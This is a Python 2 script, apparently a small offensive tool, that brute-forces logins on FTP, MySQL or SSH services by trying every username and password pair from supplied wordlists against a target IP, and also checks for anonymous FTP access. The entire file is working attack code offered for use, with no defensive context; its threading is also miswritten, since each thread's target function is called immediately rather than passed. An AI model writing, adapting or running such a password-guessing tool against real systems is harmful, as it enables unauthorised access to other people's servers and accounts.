#coding:utf-8

import optparse
import time
import Queue
import MySQLdb
import paramiko
from threading import Thread
from ftplib import FTP


def ftp_brute(ip, port):
    while not q.empty():
        try:
            uname, pword = q.get()
            ftp = FTP()
            ftp.connect(ip, port)
            ftp.login(uname, pword)
            print '[*] Successfully login with %s:%s' % (uname, pword)
            ftp.close()
        except:
            pass

def mysql_brute(ip, port):
    while not q.empty():
        try:
            uname, pword = q.get()
            conn = MySQLdb.connect(host=ip, user=uname, passwd=pword, db='mysql', port=port)
            print '[*] Successfully login with %s:%s' % (uname, pword)
            if conn:
                conn.close()
        except:
            pass

def ssh_brute(ip, port):
    while not q.empty():
        try:
            uname, pword = q.get()
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port, uname, pword, timeout=10)
            print '[*] Successfully login with %s:%s' % (uname, pword)
            ssh.close()
        except:
            pass

def ftp_anonymous_login(hostname, port):
    try:
        print '[*] Trying anonymous login...'
        ftp = FTP()
        ftp.connect(hostname, port)
        ftp.login()
        print '[*] Anonymous login succeed!'
        ftp.close()
        exit(0)
    except:
        print '[*] Anonymous login failed,trying brute force...'


parser = optparse.OptionParser()
parser.add_option('-i', '--ip', dest='ip', help='specify an ip')
parser.add_option('-o', '--port', dest='port', help='specify the port')
parser.add_option('-u', '--username', dest='uname_dir', help='specify the username directory')
parser.add_option('-p', '--password', dest='pword_dir', help='specify the password directory')
parser.add_option('-m', '--method', dest='method', help='ftp/ssh/mysql')
parser.add_option('-t', '--thread', dest='thread', type='int', default=2)
(options, args) = parser.parse_args()

if __name__ == '__main__':
    start_time = time.time()
    unamelist = [x.rstrip() for x in open(options.uname_dir)]
    pwordlist = [x.rstrip() for x in open(options.pword_dir)]
    q = Queue.Queue()
    thread_list = []
    port_dir = {'ftp': 21,
               'mysql': 3306,
               'ssh': 22}
    if not options.port:
        options.port = port_dir[options.method]
    for uname in unamelist:
        for pword in pwordlist:
            q.put((uname, pword))
    print '[*] %d possibilities generated' % q.qsize()
    if options.method == 'ftp':
        ftp_anonymous_login(options.ip, options.port)
        for i in range(options.thread):
            t = Thread(target=ftp_brute(options.ip, options.port))
            thread_list.append(t)
            t.start()
    elif options.method == 'mysql':
        for i in range(options.thread):
            t = Thread(target=mysql_brute(options.ip, options.port))
            thread_list.append(t)
            t.start()
    elif options.method == 'ssh':
        for i in range(options.thread):
            t = Thread(target=ssh_brute(options.ip, options.port))
            thread_list.append(t)
            t.start()
    else:
        print '[!] Not supported method!'
        exit()
    for t in thread_list:
        t.join()
    print '[*] Finished in %.3f s' % (time.time() - start_time)